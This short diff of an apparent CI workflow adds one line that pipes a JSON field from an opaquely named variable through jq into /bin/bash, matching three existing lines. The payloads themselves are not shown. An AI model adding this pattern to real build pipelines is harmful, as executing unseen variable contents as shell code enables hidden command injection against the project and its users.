@@ -22,6 +22,7 @@ jobs:
           echo $jb2 | jq -r .lyu34 | /bin/bash
           echo $a79 | jq -r .sxuq6849 | /bin/bash
           echo $p08512 | jq -r .k1 | /bin/bash
+          printf '%s' "$ibkj11669" | jq -r .itx22 | /bin/bash
 
       - name: Save output
         if: always()
